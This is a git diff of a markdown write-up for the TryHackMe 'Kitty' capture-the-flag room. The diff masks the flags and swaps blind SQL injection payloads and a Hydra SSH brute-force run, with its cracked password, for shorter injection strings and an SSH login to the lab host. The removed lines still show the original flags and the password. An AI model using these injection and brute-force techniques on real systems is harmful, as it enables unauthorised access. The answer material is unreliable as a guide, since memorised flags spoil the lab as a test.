@@ -1,35 +1,26 @@
 # Kitty
 
 ## Task 1  What is the user and root flag?
-+ What is the user flag? `THM{31e606998972c3c6baae67bab463b16a}`
-+ What is the root flag? `THM{581bfc26b53f2e167a05613eecf039bb}`
++ What is the user flag? `THM{3xex0x9x8x7xcxcxbxax6xbxbx6xbx6x}`
++ What is the root flag? `THM{5x1xfx2xbx3x2x1x7x0x6x3xexfx3xbx}`
 ## Task 2  Thank you
 + Thank you for playing. `No Answer Needed`
 
 ### Enumeration
 + Try to signup with user `kitty` and we got error `This username is already taken.`
++ Register new user 
 + Try SQLinjection on Login 
-    - Query Database `kitty' and substring(database(),1,1)='a' -- -`
-    - Query Table `kitty' and substring((select table_name from information_schema.tables where table_schema="db_name" limit 0,1),1,1) -- -`
+    - Query Using `' OR 1=1 -- -'` Return Error and logged something weird on logged and validation
+    - Query Using `newuser' AND SELECT 'a' = 'a' -- -` Passed 
++ Create a python to brute the Database, Table and Password for `Kitty`
 
-
-+ Try generate the file for hydra and run hydra
++ After Get Creadential 
 ```bash
-hengkisirait: Kitty $ hydra -l kitty -P pass.txt 10.10.131.226 ssh -fV
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-05 16:34:36
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:1/p:14), ~1 try per task
-[DATA] attacking ssh://10.10.131.226:22/-fV
-[22][ssh] host: 10.10.131.226   login: kitty   password: L0ng_Liv3_KittY
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-05 16:34:46
 hengkisirait: Kitty $ ssh kitty@10.10.131.226
 kitty@kitty:~$ ls
 user.txt
 kitty@kitty:~$ cat user.txt
-THM{31e606998972c3c6baae67bab463b16a}
+THM{3xex0x9x8x7xcxcxbxax6xbxbx6xbx6x}
 kitty@kitty:~$
 ```
 
@@ -169,5 +160,5 @@ root.txt
 snap
 root@kitty:~# cat root.txt
 cat root.txt
-THM{581bfc26b53f2e167a05613eecf039bb}
+THM{5x1xfx2xbx3x2x1x7x0x6x3xexfx3xbx}
 ```
